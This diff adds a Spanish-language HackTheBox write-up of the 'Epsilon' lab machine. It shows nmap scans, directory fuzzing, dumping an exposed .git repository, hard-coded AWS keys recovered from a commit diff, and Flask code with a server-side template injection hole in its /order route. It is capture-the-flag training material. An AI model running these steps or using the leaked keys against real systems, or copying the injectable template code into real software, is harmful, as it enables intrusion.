@@ -1,0 +1,392 @@
+<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><style>:root{--accent-color:#D9389C}</style><title>Epsilon</title><meta name=description content="Máquina de dificultad media"><meta name=keywords content="Bas1cTF,HTB,writeup,Linux"><meta property="og:url" content="https://bas1ctf.github.io/posts/epsilon/"><meta property="og:type" content="website"><meta property="og:title" content="Epsilon"><meta property="og:description" content="Máquina de dificultad media"><meta property="og:image" content="/images/ghost.png"><meta name=twitter:card content="summary_large_image"><meta name=twitter:title content="Epsilon"><meta name=twitter:description content="Máquina de dificultad media"><meta property="twitter:domain" content="https://bas1ctf.github.io/posts/epsilon/"><meta property="twitter:url" content="https://bas1ctf.github.io/posts/epsilon/"><meta name=twitter:image content="/images/ghost.png"><link rel=canonical href=https://bas1ctf.github.io/posts/epsilon/><link rel=stylesheet type=text/css href=https://bas1ctf.github.io//css/normalize.min.css media=print onload='this.media="all"'><link rel=stylesheet type=text/css href=https://bas1ctf.github.io//css/main.css><link disabled id=dark-theme rel=stylesheet href=https://bas1ctf.github.io//css/dark.css><script src=https://bas1ctf.github.io//js/svg-injector.min.js></script>
+<script src=https://bas1ctf.github.io//js/feather-icons.min.js></script>
+<script src=https://bas1ctf.github.io//js/main.js></script></head><body><script type=text/javascript>setThemeByUserPref()</script><header class=header><nav class=header-nav><div class=avatar><a href=https://bas1ctf.github.io/><img src=https://bas1ctf.github.io//images/ghost.png alt=avatar></a></div><div class=nav-title><a class=nav-brand href=https://bas1ctf.github.io/>Bas1cTF</a></div><div class=nav-links><div class=nav-link><a href=https://bas1ctf.github.io/><span data-feather=home></span> Home</a></div><div class=nav-link><a href=https://bas1ctf.github.io/posts/><span data-feather=book></span> Posts</a></div><div class=nav-link><a href=https://bas1ctf.github.io/tags/><span data-feather=tag></span> Tags</a></div><div class=nav-link><a href=https://github.com/Bas1cTF><span data-feather=github></span></a></div><span class=nav-icons-divider></span><div class="nav-link dark-theme-toggle"><span id=dark-theme-toggle-screen-reader-target class=sr-only></span>
+<a><span id=theme-toggle-icon data-feather=moon></span></a></div><div class=nav-link id=hamburger-menu-toggle><a><span data-feather=menu></span></a></div><ul class="nav-hamburger-list visibility-hidden"><li class=nav-item><a href=https://bas1ctf.github.io/><span data-feather=home></span> Home</a></li><li class=nav-item><a href=https://bas1ctf.github.io/posts/><span data-feather=book></span> Posts</a></li><li class=nav-item><a href=https://bas1ctf.github.io/tags/><span data-feather=tag></span> Tags</a></li><li class=nav-item><a href=https://github.com/Bas1cTF><span data-feather=github></span></a></li><li class="nav-item dark-theme-toggle"><span id=dark-theme-toggle-screen-reader-target class=sr-only>theme</span>
+<a><span id=theme-toggle-icon data-feather=moon></span></a></li></ul></div></nav></header><main id=content><div class="post container"><div class=post-header-section><h1>Epsilon</h1><small role=doc-subtitle>Máquina de dificultad media</small><p class=post-date>September 11, 2022</p><ul class=post-tags><li class=post-tag><a href=https://bas1ctf.github.io/tags/htb>HTB</a></li><li class=post-tag><a href=https://bas1ctf.github.io/tags/linux>Linux</a></li></ul></div><div class=post-content><p><p><img src=/images/epsilon/Epsilon.png alt=Banner></p><h1 id=enumeración>Enumeración</h1><p>Escaneo con nmap de todos los puertos</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-BASH data-lang=BASH><span style=display:flex><span>└─$ sudo nmap -sS --min-rate <span style=color:#ae81ff>5000</span> -vvv -open -p- -n -Pn -oG nmap/all_ports_ss 10.10.11.134
+</span></span><span style=display:flex><span>Host discovery disabled <span style=color:#f92672>(</span>-Pn<span style=color:#f92672>)</span>. All addresses will be marked <span style=color:#e6db74>&#39;up&#39;</span> and scan times may be slower.
+</span></span><span style=display:flex><span>Starting Nmap 7.92 <span style=color:#f92672>(</span> https://nmap.org <span style=color:#f92672>)</span> at 2022-09-11 19:22 EDT
+</span></span><span style=display:flex><span>Initiating SYN Stealth Scan at 19:22
+</span></span><span style=display:flex><span>Scanning 10.10.11.134 <span style=color:#f92672>[</span><span style=color:#ae81ff>65535</span> ports<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>Discovered open port 22/tcp on 10.10.11.134
+</span></span><span style=display:flex><span>Discovered open port 80/tcp on 10.10.11.134
+</span></span><span style=display:flex><span>Discovered open port 5000/tcp on 10.10.11.134
+</span></span><span style=display:flex><span>Completed SYN Stealth Scan at 19:22, 18.14s elapsed <span style=color:#f92672>(</span><span style=color:#ae81ff>65535</span> total ports<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>Nmap scan report <span style=color:#66d9ef>for</span> 10.10.11.134
+</span></span><span style=display:flex><span>Host is up, received user-set <span style=color:#f92672>(</span>0.27s latency<span style=color:#f92672>)</span>.
+</span></span><span style=display:flex><span>Scanned at 2022-09-11 19:22:07 EDT <span style=color:#66d9ef>for</span> 18s
+</span></span><span style=display:flex><span>Not shown: <span style=color:#ae81ff>64259</span> closed tcp ports <span style=color:#f92672>(</span>reset<span style=color:#f92672>)</span>, <span style=color:#ae81ff>1273</span> filtered tcp ports <span style=color:#f92672>(</span>no-response<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+</span></span><span style=display:flex><span>PORT     STATE SERVICE REASON
+</span></span><span style=display:flex><span>22/tcp   open  ssh     syn-ack ttl <span style=color:#ae81ff>63</span>
+</span></span><span style=display:flex><span>80/tcp   open  http    syn-ack ttl <span style=color:#ae81ff>63</span>
+</span></span><span style=display:flex><span>5000/tcp open  upnp    syn-ack ttl <span style=color:#ae81ff>63</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Read data files from: /usr/bin/../share/nmap
+</span></span><span style=display:flex><span>Nmap <span style=color:#66d9ef>done</span>: <span style=color:#ae81ff>1</span> IP address <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> host up<span style=color:#f92672>)</span> scanned in 18.36 seconds
+</span></span><span style=display:flex><span>           Raw packets sent: <span style=color:#ae81ff>88744</span> <span style=color:#f92672>(</span>3.905MB<span style=color:#f92672>)</span> | Rcvd: <span style=color:#ae81ff>82145</span> <span style=color:#f92672>(</span>3.286MB<span style=color:#f92672>)</span>
+</span></span></code></pre></div><p>Escaneo específico de los puertos encontrados.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-BASH data-lang=BASH><span style=display:flex><span>└─$ nmap -sCV -p 22,80,5000 -Pn -oN nmap/targeted $TARGET
+</span></span><span style=display:flex><span>Starting Nmap 7.92 <span style=color:#f92672>(</span> https://nmap.org <span style=color:#f92672>)</span> at 2022-09-11 19:26 EDT
+</span></span><span style=display:flex><span>Nmap scan report <span style=color:#66d9ef>for</span> epsilon.htb <span style=color:#f92672>(</span>10.10.11.134<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>Host is up <span style=color:#f92672>(</span>0.14s latency<span style=color:#f92672>)</span>.
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>PORT     STATE SERVICE VERSION
+</span></span><span style=display:flex><span>22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 <span style=color:#f92672>(</span>Ubuntu Linux; protocol 2.0<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>| ssh-hostkey: 
+</span></span><span style=display:flex><span>|   <span style=color:#ae81ff>3072</span> 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae <span style=color:#f92672>(</span>RSA<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>|   <span style=color:#ae81ff>256</span> b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f <span style=color:#f92672>(</span>ECDSA<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>|_  <span style=color:#ae81ff>256</span> 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb <span style=color:#f92672>(</span>ED25519<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>80/tcp   open  http    Apache httpd 2.4.41
+</span></span><span style=display:flex><span>| http-git: 
+</span></span><span style=display:flex><span>|   10.10.11.134:80/.git/
+</span></span><span style=display:flex><span>|     Git repository found!
+</span></span><span style=display:flex><span>|     Repository description: Unnamed repository; edit this file <span style=color:#e6db74>&#39;description&#39;</span> to name the...
+</span></span><span style=display:flex><span>|_    Last commit message: Updating Tracking API  <span style=color:#75715e># Please enter the commit message for...</span>
+</span></span><span style=display:flex><span>|_http-title: <span style=color:#ae81ff>403</span> Forbidden
+</span></span><span style=display:flex><span>|_http-server-header: Apache/2.4.41 <span style=color:#f92672>(</span>Ubuntu<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>5000/tcp open  http    Werkzeug httpd 2.0.2 <span style=color:#f92672>(</span>Python 3.8.10<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>|_http-title: Costume Shop
+</span></span><span style=display:flex><span>|_http-server-header: Werkzeug/2.0.2 Python/3.8.10
+</span></span><span style=display:flex><span>Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style=display:flex><span>Nmap <span style=color:#66d9ef>done</span>: <span style=color:#ae81ff>1</span> IP address <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> host up<span style=color:#f92672>)</span> scanned in 16.87 seconds
+</span></span></code></pre></div><p>De los resultados obtenidos, observamos que tenemos un sitio web realizado en python en el puerto 5000 y en el puerto 80 tenemos lo que parece ser un repositorio de git.</p><h2 id=puerto-80>Puerto 80</h2><p>En el puerto 80 al intentar acceder a algun directorio nos arrojar un código 301, por lo tanto no podemos ver el contenido del repositorio a simple vista.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-BASH data-lang=BASH><span style=display:flex><span>└─$ curl http://10.10.11.134/.git
+</span></span><span style=display:flex><span>&lt;!DOCTYPE HTML PUBLIC <span style=color:#e6db74>&#34;-//IETF//DTD HTML 2.0//EN&#34;</span>&gt;
+</span></span><span style=display:flex><span>&lt;html&gt;&lt;head&gt;
+</span></span><span style=display:flex><span>&lt;title&gt;301 Moved Permanently&lt;/title&gt;
+</span></span><span style=display:flex><span>&lt;/head&gt;&lt;body&gt;
+</span></span><span style=display:flex><span>&lt;h1&gt;Moved Permanently&lt;/h1&gt;
+</span></span><span style=display:flex><span>&lt;p&gt;The document has moved &lt;a href<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;http://10.10.11.134/.git/&#34;</span>&gt;here&lt;/a&gt;.&lt;/p&gt;
+</span></span><span style=display:flex><span>&lt;hr&gt;
+</span></span><span style=display:flex><span>&lt;address&gt;Apache/2.4.41 <span style=color:#f92672>(</span>Ubuntu<span style=color:#f92672>)</span> Server at 10.10.11.134 Port 80&lt;/address&gt;
+</span></span><span style=display:flex><span>&lt;/body&gt;&lt;/html&gt;
+</span></span></code></pre></div><p>Por lo tanto, solo podemos acceder a archivos directamente como por ejemplo el archivo HEAD.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-BASH data-lang=BASH><span style=display:flex><span>└─$ curl http://10.10.11.134/.git/HEAD
+</span></span><span style=display:flex><span>ref: refs/heads/master
+</span></span></code></pre></div><h2 id=puerto-5000>Puerto 5000</h2><p>En este puerto encontramos una página a la cual solo tenemos acceso a un login, intentando bypassear el login con SQLi o con credenciales por defecto no dio ningún resultado :(, entonces seguimos con otros métodos.
+<img src=/images/epsilon/epsilon1.png alt=Login>
+Realizando un fuzzeo rápido, encontramos otras paginas las cuales nos redireccionan al login de nuevo y el directorio <code>/track</code>, en el cual no podemos hacer mucho.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-BASH data-lang=BASH><span style=display:flex><span>└─$ ffuf -c -ic -w /usr/share/wordlists/dirb/common.txt -u http://10.10.11.134:5000/FUZZ
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        /<span style=color:#e6db74>&#39;___\  /&#39;</span>___<span style=color:#ae81ff>\ </span>          /<span style=color:#960050;background-color:#1e0010>&#39;</span>___<span style=color:#ae81ff>\ </span>      
+</span></span><span style=display:flex><span>       /<span style=color:#ae81ff>\ \_</span>_/ /<span style=color:#ae81ff>\ \_</span>_/  __  __  /<span style=color:#ae81ff>\ \_</span>_/       
+</span></span><span style=display:flex><span>       <span style=color:#ae81ff>\ \ </span>,__<span style=color:#ae81ff>\\</span> <span style=color:#ae81ff>\ </span>,__<span style=color:#ae81ff>\/\ \/\ \ \ \ </span>,__<span style=color:#ae81ff>\ </span>     
+</span></span><span style=display:flex><span>        <span style=color:#ae81ff>\ \ \_</span>/ <span style=color:#ae81ff>\ \ \_</span>/<span style=color:#ae81ff>\ \ \_\ \ \ \ \_</span>/      
+</span></span><span style=display:flex><span>         <span style=color:#ae81ff>\ \_\ </span>  <span style=color:#ae81ff>\ \_\ </span> <span style=color:#ae81ff>\ \_</span>___/  <span style=color:#ae81ff>\ \_\ </span>      
+</span></span><span style=display:flex><span>          <span style=color:#ae81ff>\/</span>_/    <span style=color:#ae81ff>\/</span>_/   <span style=color:#ae81ff>\/</span>___/    <span style=color:#ae81ff>\/</span>_/       
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>       v1.5.0 Kali Exclusive &lt;<span style=color:#ae81ff>3</span>
+</span></span><span style=display:flex><span>________________________________________________
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span> :: Method           : GET
+</span></span><span style=display:flex><span> :: URL              : http://10.10.11.134:5000/FUZZ
+</span></span><span style=display:flex><span> :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
+</span></span><span style=display:flex><span> :: Follow redirects : false
+</span></span><span style=display:flex><span> :: Calibration      : false
+</span></span><span style=display:flex><span> :: Timeout          : <span style=color:#ae81ff>10</span>
+</span></span><span style=display:flex><span> :: Threads          : <span style=color:#ae81ff>40</span>
+</span></span><span style=display:flex><span> :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
+</span></span><span style=display:flex><span>________________________________________________
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>                        <span style=color:#f92672>[</span>Status: 200, Size: 3550, Words: 522, Lines: 205, Duration: 107ms<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>home                    <span style=color:#f92672>[</span>Status: 302, Size: 208, Words: 21, Lines: 4, Duration: 102ms<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>order                   <span style=color:#f92672>[</span>Status: 302, Size: 208, Words: 21, Lines: 4, Duration: 102ms<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>track                   <span style=color:#f92672>[</span>Status: 200, Size: 4288, Words: 631, Lines: 234, Duration: 105ms<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>:: Progress: <span style=color:#f92672>[</span>4614/4614<span style=color:#f92672>]</span> :: Job <span style=color:#f92672>[</span>1/1<span style=color:#f92672>]</span> :: <span style=color:#ae81ff>171</span> req/sec :: Duration: <span style=color:#f92672>[</span>0:00:25<span style=color:#f92672>]</span> :: Errors: <span style=color:#ae81ff>0</span> ::
+</span></span></code></pre></div><h1 id=intrusión>Intrusión</h1><h2 id=repositorio-git>Repositorio Git</h2><p>Regresando al puerto 80 para obtener los archivos del repositorio, utilizamos la herramienta <code>gitdumper</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-BASH data-lang=BASH><span style=display:flex><span>└─$ ./gitdumper.sh http://10.10.11.134/.git/ repo                                            
+</span></span><span style=display:flex><span><span style=color:#75715e>###########                                         </span>
+</span></span><span style=display:flex><span><span style=color:#75715e># GitDumper is part of https://github.com/internetwache/GitTools                                            </span>
+</span></span><span style=display:flex><span><span style=color:#75715e>#                                                   </span>
+</span></span><span style=display:flex><span><span style=color:#75715e># Developed and maintained by @gehaxelt from @internetwache                                      </span>
+</span></span><span style=display:flex><span><span style=color:#75715e>#                                         </span>
+</span></span><span style=display:flex><span><span style=color:#75715e># Use at your own risk. Usage might be illegal in certain circumstances.                                    </span>
+</span></span><span style=display:flex><span><span style=color:#75715e># Only for educational purposes!                                      </span>
+</span></span><span style=display:flex><span><span style=color:#75715e>###########                                         </span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Destination folder does not exist
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Creating repo/.git/
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Downloaded: HEAD
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>-<span style=color:#f92672>]</span> Downloaded: objects/info/packs
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Downloaded: description
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Downloaded: config
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Downloaded: COMMIT_EDITMSG
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Downloaded: index
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>-<span style=color:#f92672>]</span> Downloaded: packed-refs
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Downloaded: refs/heads/master
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>-<span style=color:#f92672>]</span> Downloaded: refs/remotes/origin/HEAD
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>-<span style=color:#f92672>]</span> Downloaded: refs/stash
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Downloaded: logs/HEAD
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Downloaded: logs/refs/heads/master
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>-<span style=color:#f92672>]</span> Downloaded: logs/refs/remotes/origin/HEAD
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>-<span style=color:#f92672>]</span> Downloaded: info/refs
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Downloaded: info/exclude
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>-<span style=color:#f92672>]</span> Downloaded: /refs/wip/index/refs/heads/master
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>-<span style=color:#f92672>]</span> Downloaded: /refs/wip/wtree/refs/heads/master
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Downloaded: objects/c6/22771686bd74c16ece91193d29f85b5f9ffa91
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>-<span style=color:#f92672>]</span> Downloaded: objects/00/00000000000000000000000000000000000000
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Downloaded: objects/7c/f92a7a09e523c1c667d13847c9ba22464412f3
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Downloaded: objects/c5/1441640fd25e9fba42725147595b5918eba0f1
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Downloaded: objects/b1/0dd06d56ac760efbbb5d254ea43bf9beb56d2d
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Downloaded: objects/ce/401ccecf421ff19bf43fafe8a60a0d0f0682d0
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Downloaded: objects/5c/52105750831385d4756111e1103957ac599d02
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Downloaded: objects/b5/f4c99c772eeb629e53d284275458d75ed9a010
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Downloaded: objects/ab/07f7cdc7f410b8c8f848ee5674ec550ecb61ca
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Downloaded: objects/cf/489a3776d2bf87ac32de4579e852a4dc116ce8
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Downloaded: objects/65/b80f62da28254f67f0bea392057fd7d2330e2d
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Downloaded: objects/df/dfa17ca5701b1dca5069b6c3f705a038f4361e
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Downloaded: objects/8d/3b52e153c7d5380b183bbbb51f5d4020944630
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Downloaded: objects/fe/d7ab97cf361914f688f0e4f2d3adfafd1d7dca
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Downloaded: objects/54/5f6fe2204336c1ea21720cbaa47572eb566e34
+</span></span></code></pre></div><p>Una vez que ya descargamos el vemos los commits realizados en el repositorio, donde notamos que se actualizó un archivo entre los dos primeros, revisando la diferencia entre estos dos commits encontramos credenciales para conectarnos por medio de aws.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-BASH data-lang=BASH><span style=display:flex><span>└─$ git log --oneline --graph --all
+</span></span><span style=display:flex><span>* c622771 <span style=color:#f92672>(</span>HEAD -&gt; master<span style=color:#f92672>)</span> Fixed Typo
+</span></span><span style=display:flex><span>* b10dd06 Adding Costume Site
+</span></span><span style=display:flex><span>* c514416 Updatig Tracking API
+</span></span><span style=display:flex><span>* 7cf92a7 Adding Tracking API Module
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>└─$ git diff c514416 7cf92a7
+</span></span><span style=display:flex><span>diff --git a/track_api_CR_148.py b/track_api_CR_148.py
+</span></span><span style=display:flex><span>index 545f6fe..fed7ab9 <span style=color:#ae81ff>100644</span>
+</span></span><span style=display:flex><span>--- a/track_api_CR_148.py
+</span></span><span style=display:flex><span>+++ b/track_api_CR_148.py
+</span></span><span style=display:flex><span>@@ -5,8 +5,8 @@ from boto3.session import Session
+</span></span><span style=display:flex><span> 
+</span></span><span style=display:flex><span> 
+</span></span><span style=display:flex><span> session <span style=color:#f92672>=</span> Session<span style=color:#f92672>(</span>
+</span></span><span style=display:flex><span>-    aws_access_key_id<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;&lt;aws_access_key_id&gt;&#39;</span>,
+</span></span><span style=display:flex><span>-    aws_secret_access_key<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;&lt;aws_secret_access_key&gt;&#39;</span>,
+</span></span><span style=display:flex><span>+    aws_access_key_id<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;AQLA5M37BDN6FJP76TDC&#39;</span>,
+</span></span><span style=display:flex><span>+    aws_secret_access_key<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;OsK0o/glWwcjk2U3vVEowkvq5t4EiIreB+WdFo1A&#39;</span>,
+</span></span><span style=display:flex><span>     region_name<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;us-east-1&#39;</span>,
+</span></span><span style=display:flex><span>     endpoint_url<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;http://cloud.epsilong.htb&#39;</span><span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span> aws_lambda <span style=color:#f92672>=</span> session.client<span style=color:#f92672>(</span><span style=color:#e6db74>&#39;lambda&#39;</span><span style=color:#f92672>)</span>    
+</span></span></code></pre></div><p>También si vemos el status, observamos como no se ha hecho el commit para borrar los archivos por lo que es posible recuperarlos con el comando restore, como se muestra a continuación</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-BASH data-lang=BASH><span style=display:flex><span>└─$ git status                                              
+</span></span><span style=display:flex><span>On branch master                                              
+</span></span><span style=display:flex><span>Changes not staged <span style=color:#66d9ef>for</span> commit:                                             
+</span></span><span style=display:flex><span>  <span style=color:#f92672>(</span>use <span style=color:#e6db74>&#34;git add/rm &lt;file&gt;...&#34;</span> to update what will be committed<span style=color:#f92672>)</span>        
+</span></span><span style=display:flex><span>  <span style=color:#f92672>(</span>use <span style=color:#e6db74>&#34;git restore &lt;file&gt;...&#34;</span> to discard changes in working directory<span style=color:#f92672>)</span>           
+</span></span><span style=display:flex><span>        deleted:    server.py               
+</span></span><span style=display:flex><span>        deleted:    track_api_CR_148.py                                                           
+</span></span><span style=display:flex><span>no changes added to commit <span style=color:#f92672>(</span>use <span style=color:#e6db74>&#34;git add&#34;</span> and/or <span style=color:#e6db74>&#34;git commit -a&#34;</span><span style=color:#f92672>)</span> 
+</span></span><span style=display:flex><span>└─$ git restore track_api_CR_148.py
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>└─$ git restore server.py
+</span></span></code></pre></div><p>En los archivos obtenidos tenemos el código fuente correspondiente a la página localizada en el puerto 5000, de donde posemos recabar que se trata de un servidor realizado en Flask, se usa jwt con una llave secreta (que por el momento desconocemos) para la autenticación por medio de la cookie auth. También es posible encontrar un SSTI en la ruta <code>/order</code> la cual podremos explotar una vez tengamos acceso.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-PYTHON data-lang=PYTHON><span style=display:flex><span><span style=color:#75715e>#!/usr/bin/python3</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> jwt
+</span></span><span style=display:flex><span><span style=color:#f92672>from</span> flask <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>app <span style=color:#f92672>=</span> Flask(__name__)
+</span></span><span style=display:flex><span>secret <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&lt;secret_key&gt;&#39;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>verify_jwt</span>(token,key):
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>try</span>:
+</span></span><span style=display:flex><span>        username<span style=color:#f92672>=</span>jwt<span style=color:#f92672>.</span>decode(token,key,algorithms<span style=color:#f92672>=</span>[<span style=color:#e6db74>&#39;HS256&#39;</span>,])[<span style=color:#e6db74>&#39;username&#39;</span>]
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> username:
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>True</span>
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>else</span>:
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>False</span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>except</span>:
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>False</span>
+</span></span><span style=display:flex><span>[<span style=color:#f92672>...</span>]
+</span></span><span style=display:flex><span><span style=color:#a6e22e>@app</span><span style=color:#f92672>.</span>route(<span style=color:#e6db74>&#39;/order&#39;</span>,methods<span style=color:#f92672>=</span>[<span style=color:#e6db74>&#34;GET&#34;</span>,<span style=color:#e6db74>&#34;POST&#34;</span>])
+</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>order</span>():
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> verify_jwt(request<span style=color:#f92672>.</span>cookies<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#39;auth&#39;</span>),secret):
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> request<span style=color:#f92672>.</span>method<span style=color:#f92672>==</span><span style=color:#e6db74>&#34;POST&#34;</span>:
+</span></span><span style=display:flex><span>            costume<span style=color:#f92672>=</span>request<span style=color:#f92672>.</span>form[<span style=color:#e6db74>&#34;costume&#34;</span>]
+</span></span><span style=display:flex><span>            message <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&#39;&#39;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>            Your order of &#34;</span><span style=color:#e6db74>{}</span><span style=color:#e6db74>&#34; has been placed successfully.
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>            &#39;&#39;&#39;</span><span style=color:#f92672>.</span>format(costume)
+</span></span><span style=display:flex><span>            tmpl<span style=color:#f92672>=</span>render_template_string(message,costume<span style=color:#f92672>=</span>costume)
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> render_template(<span style=color:#e6db74>&#39;order.html&#39;</span>,message<span style=color:#f92672>=</span>tmpl)
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>else</span>:
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> render_template(<span style=color:#e6db74>&#39;order.html&#39;</span>)
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>else</span>:
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> redirect(<span style=color:#e6db74>&#39;/&#39;</span>,code<span style=color:#f92672>=</span><span style=color:#ae81ff>302</span>)
+</span></span><span style=display:flex><span>[<span style=color:#f92672>...</span>]
